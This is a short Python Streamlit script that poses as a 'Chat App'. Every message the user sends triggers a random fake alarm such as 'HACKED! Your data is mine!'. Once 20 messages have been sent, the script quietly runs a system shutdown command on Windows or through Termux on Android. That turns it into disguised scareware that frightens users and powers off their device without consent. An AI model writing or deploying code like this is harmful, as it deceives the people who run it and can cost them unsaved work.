import streamlit as st
import os
import random

# Fake hacked messages
hacked_messages = [
    "HACKED! Your data is mine!",
    "Warning: Unauthorized access detected!",
    "Your phone will self-destruct in 10 seconds...",
    "System breach detected! All files compromised!",
    "You shouldn't have opened this app..."
]

# Session state for tracking messages
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0

st.title("Chat App")
user_input = st.text_input("Send a message:")

if st.button("Send") and user_input:
    # Display hacked message randomly
    fake_message = random.choice(hacked_messages)
    st.warning(fake_message)
    
    # Increment message count
    st.session_state.message_count += 1

    # If 20 messages are sent, shutdown the device
    if st.session_state.message_count >= 20:
        st.error("Critical Error! Shutting down...")
        
        # Shutdown command (for Windows or Android)
        try:
            if os.name == 'nt':  # Windows
                os.system("shutdown /s /t 5")
            else:  # Android (Termux required)
                os.system("termux-shutdown")
        except Exception as e:
            st.error(f"Shutdown failed: {e}")
